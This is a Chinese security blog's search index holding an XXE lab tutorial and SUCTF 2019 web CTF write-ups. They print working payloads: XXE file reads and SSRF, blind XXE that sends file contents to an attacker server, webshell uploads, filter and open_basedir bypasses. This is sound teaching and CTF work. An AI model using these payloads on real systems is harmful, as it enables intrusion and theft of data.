{"meta":{"title":"慢就是快 | glotozz'blog","subtitle":"这个人比较菜，什么话也留不下","description":null,"author":"glotozz","url":"http://yoursite.com","root":"/"},"pages":[{"title":"感谢","date":"2019-07-18T11:37:42.000Z","updated":"2019-07-18T11:38:41.901Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"谢谢支持我的小伙伴"}],"posts":[{"title":"Hacker101 Encrypted Pastebin","slug":"Hacker101-Encrypted-Pastebin","date":"2019-08-23T01:23:16.000Z","updated":"2019-08-23T01:55:19.505Z","comments":true,"path":"2019/08/23/Hacker101-Encrypted-Pastebin/","link":"","permalink":"http://yoursite.com/2019/08/23/Hacker101-Encrypted-Pastebin/","excerpt":"之前在看安全客的时候翻到一篇Hacker101 CTF的文章，据说在这个平台做题会有私人渗透测试邀请😀。个人感觉这里的题目比较偏实战，所以还是不错的 其中有一题cbc字节翻转攻击，这里就记录下 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"之前在看安全客的时候翻到一篇Hacker101 CTF的文章，据说在这个平台做题会有私人渗透测试邀请😀。个人感觉这里的题目比较偏实战，所以还是不错的 其中有一题cbc字节翻转攻击，这里就记录下 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; Encrypted Pastebin 这是","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://yoursite.com/tags/wp/"},{"name":"cbc字节翻转攻击","slug":"cbc字节翻转攻击","permalink":"http://yoursite.com/tags/cbc字节翻转攻击/"}]},{"title":"xxe环境搭建及实战","slug":"xxe环境搭建及实战","date":"2019-08-21T23:11:51.000Z","updated":"2019-08-22T13:45:10.408Z","comments":true,"path":"2019/08/22/xxe环境搭建及实战/","link":"","permalink":"http://yoursite.com/2019/08/22/xxe环境搭建及实战/","excerpt":"蒟蒻的我给学弟学妹培训了两天代码审计，感觉身体还(被)行(掏)吧(空) 早上看到微信一篇文章xxe环境搭建即实战，之前也做过类似的题（每次都是网上临时找的payload），反正没啥事儿，就自己搭建下环境。 以后就不用临时找了😄","text":"蒟蒻的我给学弟学妹培训了两天代码审计，感觉身体还(被)行(掏)吧(空) 早上看到微信一篇文章xxe环境搭建即实战，之前也做过类似的题（每次都是网上临时找的payload），反正没啥事儿，就自己搭建下环境。 以后就不用临时找了😄 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; xxe-lab这个项目使用四种当下最常用语言的网站编写语言来编写的一个存在xxe漏洞的web demo，然后我简单观察了一下，首先前端都是通过ajax发送请求，发送的数据格式是application/xml;charset=utf-8，接收到的数据格式也是xml 12345678910111213141516171819202122232425262728293031323334&lt;script type=&apos;text/javascript&apos;&gt; function doLogin()&#123; var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;)&#123; alert(&quot;Please enter the username and password!&quot;); return; &#125; var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;doLogin&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) &#123; var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;)&#123; $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); &#125;else if(code == &quot;1&quot;)&#123; $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); &#125;else&#123; $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); &#125; &#125;, error: function (XMLHttpRequest,textStatus,errorThrown) &#123; $(&quot;.msg&quot;).text(errorThrown + &apos;:&apos; + textStatus); &#125; &#125;); &#125;&lt;/script&gt; 1、至于服务端，先分析下php123456789101112131415161718192021222324252627282930313233&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &apos;admin&apos;; //账号$PASSWORD = &apos;admin&apos;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&apos;php://input&apos;);try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); &#125;else&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&apos;Content-Type: text/html; charset=utf-8&apos;);echo $result;?&gt; 搭建完成之后尝试抓包 明显的xml格式。 下面用两种方法复现（有无回显） 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;Hacking&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; 发现xml成功被解析 构造任意文件读取（base64编码读取php文件） 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; 注意点，SYSTEM一定要大写 window下也是file:/// 稍微介绍下DTD实体声明 1、内部实体声明（通常危害极小）1&lt;!ENTITY 实体名称 “实体的值”&gt; 比如我的第一次尝试 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;Hacking&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; 2、外部实体声明XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种： 123file:///path/to/file.exthttp://urlphp://filter/read=convert.base64-encode/resource=conf.php 1&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt; 比如第二次尝试 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; 外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示： ========================================================================== 2、xxe检测 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 xxe漏洞检测（黑盒）先检测XML是否会被成功解析 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;&lt;root&gt;&amp;name;&lt;/root&gt; 再检测是否支持DTD引用外部实体 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM &quot;http://59.110.164.44/index.html&quot;&gt; %name; ]&gt; 在服务器上查看是否存在访问记录 xxe白盒审计 最开始，引入一个file_get_contents函数，将整个XML数据读入data字符串中，然后交给php的xml解析函数simplexml_load_string()解析，解析后的数据赋给xml变量。 这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。 12345&lt;?php $data = file_get_contents(&apos;php://input&apos;); //获取提交的XML数据 $xml = simplexml_load_string($data); // 交给PHP的XML解析函数 echo $xml-&gt;name;?&gt; ========================================================================== 3、xxe攻击方式 有回显的情况 通常以下两种 123456789&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; 外部evil.dtd的内容 1&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; 还可以内网站点的入侵 123&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.6.100/news.php?newsid=-1+union+select+1,(user())&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; 无回显的情况 blind xxe漏洞方案1：test.php 123&lt;?php file_put_contents(&quot;test.txt&quot;, $_GET[&apos;file&apos;]) ; ?&gt; index.php 123456789101112131415&lt;?php $xml=&lt;&lt;&lt;EOF &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///C:/test.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://localhost/test.xml&quot;&gt; %remote; %all; %send; ]&gt; EOF; $data = simplexml_load_string($xml) ; echo &quot;&lt;pre&gt;&quot; ; print_r($data) ; ?&gt; test.html 1&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://localhost/test.php?file=%file;&apos;&gt;&quot;&gt; 当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。 blind xxe漏洞方案2：1234&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://59.110.164.44/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;b;&lt;/foo&gt; 1&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; 或者 12&lt;!DOCTYPE a SYSTEM &quot;http://59.110.164.44/evil.dtd&quot;&gt;&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt; dtd内容 1&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; 出现报错DOMDocument::loadXML(): Malformed declaration expecting version in Entity, line: 1 in 需要把 12&gt; &lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&gt; 删去 blind xxe漏洞方案3： 可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt; # /etc/issue&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;%dtd;%send;]&gt; evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25 1234&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://xxx.xxx.xxx/?%file;&apos;&gt;&quot;&gt;%all; ========================================================================== 这里复现下第三种 1234567&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://59.110.164.44/evil.dtd&quot;&gt; %dtd; %send;]&gt; 在服务上部署evil.dtd文件 1234&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://59.110.164.44/?%file;&apos;&gt;&quot;&gt;%all; base64解码即可 ========================================================================== 其他危害1、命令执行 php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。 123456789101112&gt; &lt;?php&gt; $xml = &lt;&lt;&lt;EOF&gt; &lt;?xml version = &quot;1.0&quot;?&gt;&gt; &lt;!DOCTYPE ANY [&gt; &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt; # id&gt; ]&gt;&gt; &lt;x&gt;&amp;f;&lt;/x&gt;&gt; EOF;&gt; $data = simplexml_load_string($xml);&gt; print_r($data);&gt; ?&gt;&gt; 2、内网探测/SSRF 由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 123456789101112&gt; &lt;?php&gt; $xml = &lt;&lt;&lt;EOF&gt; &lt;?xml version = &quot;1.0&quot;?&gt;&gt; &lt;!DOCTYPE ANY [&gt; &lt;!ENTITY f SYSTEM &quot;http://192.168.1.1:80/&quot;&gt;&gt; ]&gt;&gt; &lt;x&gt;&amp;f;&lt;/x&gt;&gt; EOF;&gt; $data = simplexml_load_string($xml);&gt; print_r($data);&gt; ?&gt;&gt; 3、拒绝服务攻击 1234567891011121314&gt; &lt;?xml version=&quot;1.0&quot;?&gt;&gt; &lt;!DOCTYPE lolz [&gt; &lt;!ENTITY lol &quot;lol&quot;&gt;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;&gt; ]&gt;&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;&gt; 上面样例代码2中的XXE漏洞攻击就是著名的’billion laughs’ 攻击。 该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha!”字符串，从而导致 DDoS 攻击。 原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。除了这些，攻击者还可以读取服务器上的敏感数据，还能通过端口扫描，获取后端系统的开放端口。 ========================================================================== 防御禁用外部实体 PHP libxml_disable_entity_loader(true); JAVA DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的数据 过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC 参考链接：https://www.cnblogs.com/zhaijiahui/p/9147595.html https://github.com/c0ny1/xxe-lab https://mp.weixin.qq.com/s/MnY6dd8YDxfCmssYzDurnA https://en.wikipedia.org/wiki/Billion_laughs","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/tags/漏洞复现/"},{"name":"xxe","slug":"xxe","permalink":"http://yoursite.com/tags/xxe/"}]},{"title":"suctf2019 web","slug":"suctf2019-web","date":"2019-08-17T01:09:09.000Z","updated":"2019-08-22T13:45:29.648Z","comments":true,"path":"2019/08/17/suctf2019-web/","link":"","permalink":"http://yoursite.com/2019/08/17/suctf2019-web/","excerpt":"这两天头有点晕，suctf随便做做 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"这两天头有点晕，suctf随便做做 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; web1本来是没啥思路的，上传.htaccess成功但是不被解析。。。。😥 上传php文件的时候提示不能存在&lt;?，这个用下面的绕过即可，但是要求php小于7.0 1&lt;script language=php&gt;system(&quot;cat 访问的文件名.txt&quot;)&lt;/script&gt; 突然农大的一位大佬说可以利用.user.ini 因为当前文件夹下存在index.php，所以上传.user.ini. 12GIF89aauto_prepend_file=1.jpg 继续上传1.jpg 12GIF89a&lt;script language=&apos;php&apos;&gt;@eval($_GET[cmd])&lt;/script&gt; 访问路径 修改cmd=system(‘cat /flag’);即可 ========================================================================== web21234567891011121314151617181920212223242526272829303132333435363738&lt;?php function get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; $hhh = @$_GET[&apos;_&apos;]; if (!$hhh)&#123; highlight_file(__FILE__); &#125; if(strlen($hhh)&gt;18)&#123; die(&apos;One inch long, one inch strong!&apos;); &#125; if ( preg_match(&apos;/[\\x00- 0-9A-Za-z\\&apos;&quot;\\`~_&amp;.,|=[\\x7F]+/i&apos;, $hhh) ) die(&apos;Try something else!&apos;); $character_type = count_chars($hhh, 3); if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;); eval($hhh);?&gt; 长度小于等于18，使用的字符串种类小于等于12， 12&gt; preg_match(&apos;/[\\x00- 0-9A-Za-z\\&apos;&quot;\\`~_&amp;.,|=[\\x7F]+/i&apos;, $hhh)&gt; 正则的意思是匹配 \\x00 到空格 (\\x20) 的字符，0 到 9 的数字一些字符 以及 DEL（\\x7f）字符 \\x00 =&gt; @ \\x7F =&gt; 其实这是完整的，应该存在256种，直到\\xff 首先第一步需要绕过传值，本地测试把@去掉，提示 Notice: Undefined index: _ in E:\\Program Files\\phpstudy_pro\\WWW\\2.php on line 4 1说明这里是_即可，所以get传值的key为_ 韩大佬率先写出了如下payload，利用异或构造出_GET，再利用{}的trick 1?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 自己写了个脚本，很丑陋 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import urllibG = []E = []T = []_ = []str = r&apos;\\&apos;&quot;`~_&amp;.,|=[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;#print len(str)str2 = []for i1 in str: str2.append(ord(i1))#print str2str1 = &quot;0123456789abcdef&quot;str3 = []for i1 in str1: for j1 in str1: tmp = &quot;0x&quot;+i1+j1 str3.append(tmp)num = 1for i1 in str3: for j1 in str3: tmp1 = int(i1,16) tmp2 = int(j1,16) if (tmp1 in str2) or (tmp2 in str2) or (0&lt;=tmp1&lt;=32) or (0&lt;=tmp2&lt;=32) or (tmp1==127) or (tmp2==127): continue if tmp1^tmp2==ord(&apos;G&apos;): G.append(i1+&quot;^&quot;+j1) if tmp1^tmp2==ord(&apos;E&apos;): E.append(i1+&quot;^&quot;+j1) if tmp1^tmp2==ord(&apos;T&apos;): T.append(i1+&quot;^&quot;+j1) if tmp1^tmp2==ord(&apos;_&apos;): _.append(i1+&quot;^&quot;+j1)print _print Gprint Eprint Tminn = 1000000000result = &quot;&quot;for t1 in _: for t2 in G: for t3 in E: for t4 in T: res = set() tmp = t1.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) tmp = t2.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) tmp = t3.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) tmp = t4.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) if len(res) &lt;= minn: minn = len(res) result = t1 + &quot; &quot; + t2 + &quot; &quot; + t3 + &quot; &quot; + t4 print resultprint result 一开始在对结果更新的时候选择了len(res)&lt;minn，导致出现的结果如下 %24%3c%3e%2f^%7b%7b%7b%7b 跑出来了很多，但是要注意有一些不行，比如上面这个，存在&lt;&gt;，会导致php语法错误。所以用韩大佬的方法就是直接用%ff异或👍 将结果更新修改为len(res)&lt;=minn，或者直接从列表在选择最后一个即可，必然是%ff 最后构造 %a0%b8%ba%ab^%ff%ff%ff%ff 完整payload 1?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 成功执行函数。 接下来是利用get_the_flag()上传文件 1234$extension = substr($name, strrpos($name,&quot;.&quot;)+1);if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); 自己在当前页面构造一个文件上传 123456&lt;body&gt; &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt; &lt;/form&gt;&lt;/body&gt; 注意上面的name要改成file，和代码一致 strrpos()返回字符串 haystack 中 needle 最后一次出现的数字位置。 返回提取的子字符串， 或者在失败时返回 FALSE。 php的后缀和&lt;?似乎无法绕过（php7.2）， 上传.htaccess，在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果，所以新的.htaccess文件内容如下 123456789#define width 1337#define height 1337AddType application/x-httpd-php .jpgphp_value zend.multibyte 1php_value zend.detect_unicode 1php_value display_errors 1 123接下来可以上传jpg了，那么对于上传的php要绕过其&lt;?的过滤，目标服务器是php7.2那么&lt;script&gt;形式不行，这里使用了php内容的不同编码格式来bypass，只要把内容换个编码形式就好，作者用的是utf-16， 给出链接中生成的脚本 1234567891011121314151617181920212223242526272829303132333435# !/usr/bin/python3# Description : create and bypass file upload filter with .htaccess# Author : Thibaud Robin# Will prove the file is a legit xbitmap file and the size is 1337x1337SIZE_HEADER = b&quot;\\n\\n#define width 1337\\n#define height 1337\\n\\n&quot;def generate_php_file(filename, script): phpfile = open(filename, &apos;wb&apos;) phpfile.write(script.encode(&apos;utf-16be&apos;)) phpfile.write(SIZE_HEADER) phpfile.close()def generate_htacess(): htaccess = open(&apos;..htaccess&apos;, &apos;wb&apos;) htaccess.write(SIZE_HEADER) htaccess.write(b&apos;AddType application/x-httpd-php .php16\\n&apos;) htaccess.write(b&apos;php_value zend.multibyte 1\\n&apos;) htaccess.write(b&apos;php_value zend.detect_unicode 1\\n&apos;) htaccess.write(b&apos;php_value display_errors 1\\n&apos;) htaccess.close()generate_htacess()generate_php_file(&quot;webshell.php16&quot;, &quot;&lt;?php system($_GET[&apos;cmd&apos;]); die(); ?&gt;&quot;)generate_php_file(&quot;scandir.php16&quot;, &quot;&lt;?php echo implode(&apos;\\n&apos;, scandir($_GET[&apos;dir&apos;])); die(); ?&gt;&quot;)generate_php_file(&quot;getfile.php16&quot;, &quot;&lt;?php echo file_get_contents($_GET[&apos;file&apos;]); die(); ?&gt;&quot;)generate_php_file(&quot;info.php16&quot;, &quot;&lt;?php phpinfo(); die(); ?&gt;&quot;) 一开始用的system()，发现system被禁用 查看禁用的函数 使用eval构造一句话连上蚁剑 先尝试了蚁剑的插件去绕过disabled_function，但是反复试探还是不行 后来再蚁剑的微信公众号发了篇文章说为什么明明成功创建so文件却不能bypass，失败的原因就是之前的 插件的代理脚本使用的是curl来进行转发的，而这个环境里没有这个扩展，于是改用fsockopen实现代理。 中间先尝试了print_r(scandir(‘/‘)) 还存在open_basedir限制 查找php open_basedir bypass的poc 将下面的php文件传上去 12345678910111213&lt;?php mkdir(&quot;/tmp/fuck&quot;); chdir(&quot;/tmp/fuck&quot;); ini_set(&apos;open_basedir&apos;,&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); ini_set(&apos;open_basedir&apos;,&apos;/&apos;); print_r(scandir(&apos;/&apos;)); var_dump(file_get_contents(&apos;THis_Is_tHe_F14g&apos;));?&gt; ================================================== web2应该算是非预期解，并没有真正绕过disable_functions，但是 这次比赛只做出了这两题，还是靠农大的大佬们带的，继续加油😘 而且感觉学到了很多知识，以后还是要多看看blog（p神，一叶飘零等大大佬）以及最新的bypass =============================================================== 赛后看了wp，记录下没做出来的解题思路 python nginx12345678910111213141516171819202122def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &apos;suctf.cc&apos;: return &quot;我扌 your problem? 111&quot; parts =list(urlsplit(url)) host = parts[1] if host == &apos;suctf.cc&apos;: return &quot;我扌 your problem? 222 &quot;+host newhost =[] for h in host.split(&apos;.&apos;): newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) parts[1] = &apos;.&apos;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&apos; &apos;)[0] host = parse.urlparse(finalUrl).hostname if host == &apos;suctf.cc&apos;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; 我们需要最后利用下面的代码来读取文件 1return urllib.request.urlopen(finalUrl).read() 附上调试代码 12345678910111213from urllib.parse import *url = &quot;file://suctf.cc&quot;host = urlparse(url)print(host.hostname)parts = list(urlsplit(url))print(parts)host = parts[1]print(&quot;host:&quot;+host)print(parts)finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]print(finalUrl)host = urlparse(finalUrl).hostnameprint(&quot;host:&quot;+host) 先读取nginx配置得到flag路径 ?url=file:////suctf.cc/../../../../../usr/local/nginx/conf/nginx.conf 然后读取flag ?url=file:////suctf.cc/../../../../../../usr/fffffflag De1ta的wp给出了另一种方法， ?url=file://suctf.c%e2%84%82/etc/passwd 其中%e2%84%82是怎么来的 \\u2102 16进制==&gt;10进制 8450 （属于范围2048 - 65535） ==&gt; 0010 0001 0000 0010 ==&gt; 从右至左将二进制数填充到X里面 1110XXXX 10XXXXXX 10XXXXXX ==&gt; 11100010 10000100 10000010 ==&gt; 111000101000010010000010 ==&gt; e28482 easy_sql1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php session_start(); include_once &quot;config.php&quot;; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass); if(!$MysqlLink)&#123; die(&quot;Mysql Connect Error!&quot;); &#125; $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB)&#123; die(&quot;Choose Database Error!&quot;); &#125; foreach ($_POST as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $post[$k] = trim(addslashes($v)); &#125; &#125; foreach ($_GET as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $get[$k] = trim(addslashes($v)); &#125; &#125; //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a &gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post[&apos;query&apos;]))&#123; $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; 